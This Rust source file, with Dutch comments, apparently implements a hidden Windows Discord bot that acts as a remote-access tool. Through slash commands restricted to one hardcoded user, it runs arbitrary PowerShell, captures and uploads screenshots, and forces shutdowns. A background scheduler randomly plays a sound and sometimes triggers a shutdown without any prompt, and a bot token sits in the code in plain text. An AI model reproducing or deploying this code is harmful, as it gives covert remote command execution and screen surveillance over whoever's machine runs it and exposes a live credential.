#![windows_subsystem = "windows"]

use image::ImageFormat;
use rand::Rng;
use rodio::{Decoder, OutputStream, Sink};
use serenity::async_trait;
use serenity::builder::{
    CreateAttachment, CreateCommand, CreateCommandOption, CreateInteractionResponse,
    CreateInteractionResponseFollowup, CreateInteractionResponseMessage, EditInteractionResponse,
};
use serenity::model::application::{CommandOptionType, Interaction, ResolvedOption, ResolvedValue};
use serenity::model::gateway::Ready;
use serenity::model::id::{ChannelId, GuildId};
use serenity::prelude::*;
use std::io::Cursor;
use std::process::Command;
use std::sync::{
    Arc,
    atomic::{AtomicBool, Ordering},
};
use std::thread;
use std::time::Duration;
use xcap::Monitor;

const MIJN_USER_ID: u64 = 677911783695974405; // Vervang door jouw numerieke Discord User ID
const TEST_GUILD_ID: u64 = 1453364114700369952; // Jouw Discord Server ID
const STATUS_CHANNEL_ID: u64 = 1575510972808953999; // Jouw Discord Channel ID
// const SOUND: &[u8] = include_bytes!("../temp.mp3");
const SOUND: &[u8] = include_bytes!("../sound1.mp3");

// Direct geluid afspelen bij /floep
pub fn floep() {
    let Ok((_stream, stream_handle)) = OutputStream::try_default() else {
        eprintln!("Geen audio-uitvoerapparaat gevonden");
        return;
    };

    let Ok(sink) = Sink::try_new(&stream_handle) else {
        eprintln!("Kon audio-sink niet aanmaken");
        return;
    };

    match Decoder::new(Cursor::new(SOUND)) {
        Ok(source) => {
            sink.set_volume(1.0); // set the volume to 1.0
            sink.append(source);
            sink.sleep_until_end();
        }
        Err(e) => eprintln!("Fout bij decoderen van sound1.mp3: {e}"),
    }
}

// Screenshot maken bij /screenshot
pub fn maak_screenshot() -> Result<Vec<u8>, String> {
    let monitors = Monitor::all().map_err(|e| format!("Kan monitoren niet ophalen: {e}"))?;
    let primary = monitors
        .into_iter()
        .next()
        .ok_or_else(|| "Geen monitor gevonden".to_string())?;

    let img = primary
        .capture_image()
        .map_err(|e| format!("Screenshot mislukt: {e}"))?;

    let mut png_bytes = Vec::new();
    let mut cursor = Cursor::new(&mut png_bytes);
    image::DynamicImage::ImageRgba8(img)
        .write_to(&mut cursor, ImageFormat::Png)
        .map_err(|e| format!("PNG-conversie mislukt: {e}"))?;

    Ok(png_bytes)
}

// PowerShell uitvoeren bij /command
pub async fn voer_powershell_uit(ps_command: &str) -> String {
    let output = tokio::process::Command::new("powershell")
        .args(["-NoProfile", "-Command", ps_command])
        .output()
        .await;

    match output {
        Ok(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout);
            let stderr = String::from_utf8_lossy(&out.stderr);
            let mut resultaat = format!("{stdout}{stderr}").trim().to_string();

            if resultaat.is_empty() {
                resultaat = "(Geen output teruggegeven)".to_string();
            }

            if resultaat.len() > 1900 {
                resultaat.truncate(1900);
                resultaat.push_str("\n... (afgekapt)");
            }
            resultaat
        }
        Err(e) => format!("Fout bij starten van PowerShell: {e}"),
    }
}

// Pc afsluiten bij /shutdown
pub fn sluit_pc_af() -> Result<(), String> {
    Command::new("shutdown")
        .args(["/s", "/t", "5", "/f"])
        .output()
        .map(|_| ())
        .map_err(|e| format!("Kon shutdown niet starten: {e}"))
}

// Achtergrond-scheduler met kansen
fn run_scheduler(running: Arc<AtomicBool>) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let startup_delay = 300;
    let interval = 300;

    let (_stream, stream_handle) = OutputStream::try_default()?;
    let sink = Sink::try_new(&stream_handle)?;
    sink.set_volume(1.0);

    let mut rng = rand::thread_rng();

    for _ in 0..startup_delay {
        if !running.load(Ordering::SeqCst) {
            break;
        }
        thread::sleep(Duration::from_secs(1));
    }

    while running.load(Ordering::SeqCst) {
        for _ in 0..interval {
            if !running.load(Ordering::SeqCst) {
                break;
            }
            thread::sleep(Duration::from_secs(1));
        }

        if !running.load(Ordering::SeqCst) {
            break;
        }

        if rng.gen_bool(0.5) {
            let decoder = Decoder::new(Cursor::new(SOUND))?;
            sink.append(decoder);
            sink.sleep_until_end();
            println!("Playback completed.");
        }

        if rng.gen_bool(0.1) {
            if let Err(e) = Command::new("shutdown")
                .args(["/s", "/t", "60", "/c", "Hello from Rust"])
                .output()
            {
                eprintln!("Failed to execute shutdown command: {e}");
            }
        }
    }

    Ok(())
}

struct Handler;

#[async_trait]
impl EventHandler for Handler {
    async fn ready(&self, ctx: Context, ready: Ready) {
        println!("Ingelogd als {}", ready.user.name);

        let guild_id = GuildId::new(TEST_GUILD_ID);
        let commands = vec![
            CreateCommand::new("floep").description("Speelt sound1.mp3 af"),
            CreateCommand::new("screenshot").description("Maakt een screenshot van je pc"),
            CreateCommand::new("command")
                .description("Voert een PowerShell-commando uit op je pc")
                .add_option(
                    CreateCommandOption::new(
                        CommandOptionType::String,
                        "cmd",
                        "Het PowerShell-commando om uit te voeren",
                    )
                    .required(true),
                ),
            CreateCommand::new("shutdown").description("Sluit je pc af over 5 seconden"),
        ];

        if let Err(e) = guild_id.set_commands(&ctx.http, commands).await {
            eprintln!("Kon commands niet registreren: {e}");
        }

        let channel_id = ChannelId::new(STATUS_CHANNEL_ID);
        let _ = channel_id
            .say(&ctx.http, format!("Bot online als **{}**.", ready.user.name))
            .await;
    }

    async fn interaction_create(&self, ctx: Context, interaction: Interaction) {
        let Interaction::Command(command) = interaction else {
            return;
        };

        if command.user.id.get() != MIJN_USER_ID {
            let msg = CreateInteractionResponseMessage::new()
                .content("Geen toegang.")
                .ephemeral(true);
            let _ = command
                .create_response(&ctx.http, CreateInteractionResponse::Message(msg))
                .await;
            return;
        }

        match command.data.name.as_str() {
            "floep" => {
                tokio::task::spawn_blocking(floep);
                let msg = CreateInteractionResponseMessage::new().content("Floep afgespeeld!");
                let _ = command
                    .create_response(&ctx.http, CreateInteractionResponse::Message(msg))
                    .await;
            }

            "screenshot" => {
                let _ = command.defer(&ctx.http).await;

                let res = tokio::task::spawn_blocking(maak_screenshot).await;
                match res {
                    Ok(Ok(bytes)) => {
                        let attachment = CreateAttachment::bytes(bytes, "screenshot.png");
                        let followup = CreateInteractionResponseFollowup::new()
                            .content("Screenshot van je pc:")
                            .add_file(attachment);
                        let _ = command.create_followup(&ctx.http, followup).await;
                    }
                    Ok(Err(err)) => {
                        let _ = command
                            .edit_response(
                                &ctx.http,
                                EditInteractionResponse::new().content(err),
                            )
                            .await;
                    }
                    Err(e) => {
                        let _ = command
                            .edit_response(
                                &ctx.http,
                                EditInteractionResponse::new().content(format!("Thread-fout: {e}")),
                            )
                            .await;
                    }
                }
            }

            "command" => {
                let _ = command.defer(&ctx.http).await;

                let ps_cmd = command
                    .data
                    .options()
                    .into_iter()
                    .find_map(|opt| match opt {
                        ResolvedOption {
                            name: "cmd",
                            value: ResolvedValue::String(s),
                            ..
                        } => Some(s),
                        _ => None,
                    })
                    .unwrap_or("");

                let output = voer_powershell_uit(ps_cmd).await;
                let antwoord = format!("```powershell\n{output}\n```");

                let _ = command
                    .edit_response(
                        &ctx.http,
                        EditInteractionResponse::new().content(antwoord),
                    )
                    .await;
            }

            "shutdown" => {
                let res = sluit_pc_af();
                let tekst = match res {
                    Ok(()) => "Pc wordt over 5 seconden afgesloten (`shutdown /a` om te annuleren).",
                    Err(ref e) => e.as_str(),
                };
                let msg = CreateInteractionResponseMessage::new().content(tekst);
                let _ = command
                    .create_response(&ctx.http, CreateInteractionResponse::Message(msg))
                    .await;
            }

            _ => {}
        }
    }
}

#[tokio::main]
async fn main() {
    let token: &str = "MTU3NTUxMDIzMTU3NDY0MjcwOA.GZEJsX.dvYJFHDi0ICECsgtHNwaR8xqI3SxvXmQfrWmYU";

    let running = Arc::new(AtomicBool::new(true));
    let running_ctrlc = Arc::clone(&running);
    let running_sched = Arc::clone(&running);

    let _ = ctrlc::set_handler(move || {
        running_ctrlc.store(false, Ordering::SeqCst);
    });

    let scheduler_handle = thread::spawn(move || {
        if let Err(e) = run_scheduler(running_sched) {
            eprintln!("Scheduler gestopt met fout: {e}");
        }
    });

    let mut client = Client::builder(&token, GatewayIntents::empty())
        .event_handler(Handler)
        .await
        .expect("Fout bij aanmaken van Discord-client");

    if let Err(why) = client.start().await {
        eprintln!("Client fout: {why:?}");
    }

    running.store(false, Ordering::SeqCst);
    let _ = scheduler_handle.join();
}
